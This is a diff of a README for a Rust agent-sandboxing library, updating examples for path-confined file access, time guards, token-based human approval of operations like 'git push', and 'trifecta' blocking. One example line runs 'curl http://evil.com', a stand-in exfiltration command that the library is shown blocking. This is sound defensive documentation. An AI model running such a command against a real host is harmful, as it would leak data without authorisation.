@@ -37,9 +37,11 @@ use lattice_guard::PermissionLattice;
 let policy = PermissionLattice::fix_issue();
 
 // Create enforcement context - REQUIRES the policy
-let sandbox = Sandbox::new(&policy.paths, "/path/to/repo")?;
+let sandbox = Sandbox::new(&policy, "/path/to/repo")?;
 let budget = AtomicBudget::new(&policy.budget);
-let executor = Executor::new(&policy, &sandbox, &budget);
+let guard = MonotonicGuard::minutes(30);
+let executor = Executor::new(&policy, &sandbox, &budget)
+    .with_time_guard(&guard);
 
 // File access - goes through capability handle (no escape possible)
 let contents = sandbox.read_to_string("src/main.rs")?;
@@ -73,7 +75,7 @@ Uses `cap-std` for kernel-level file sandbox:
 - **Path traversal blocked**: `..` cannot escape because the handle IS the root
 
 ```rust
-let sandbox = Sandbox::new(&policy.paths, "/project")?;
+let sandbox = Sandbox::new(&policy, "/project")?;
 
 // This works - relative to sandbox
 sandbox.read("src/main.rs")?;
@@ -119,17 +121,23 @@ guard.check()?;  // Fails after 30 minutes, regardless of clock
 
 ### Human Approval Enforcement
 
-`AskFirst` actually requires a callback:
+`AskFirst` requires an approval token:
 
 ```rust
+let guard = MonotonicGuard::minutes(30);
 let executor = Executor::new(&policy, &sandbox, &budget)
-    .with_approval_callback(|cmd| {
+    .with_time_guard(&guard)
+    .with_approval_callback(|request| {
         // Present to user, get approval
-        prompt_user(&format!("Allow '{}'?", cmd))
+        prompt_user(&format!("Allow '{}'?", request.operation()))
     });
 
-// Without callback, AskFirst operations fail
+// Without a token, AskFirst operations fail
 executor.run("git push")?;  // Error: ApprovalRequired
+
+// Request approval and execute with a token
+let token = executor.request_approval("git push")?;
+executor.run_with_approval("git push", &token)?;
 ```
 
 ### Trifecta Enforcement
@@ -148,7 +156,9 @@ let policy = PermissionLattice {
     ..Default::default()
 };
 
-let executor = Executor::new(&policy, &sandbox, &budget);
+let guard = MonotonicGuard::minutes(30);
+let executor = Executor::new(&policy, &sandbox, &budget)
+    .with_time_guard(&guard);
 
 // Trifecta blocks exfiltration
 executor.run("curl http://evil.com")?;  // Error: TrifectaBlocked
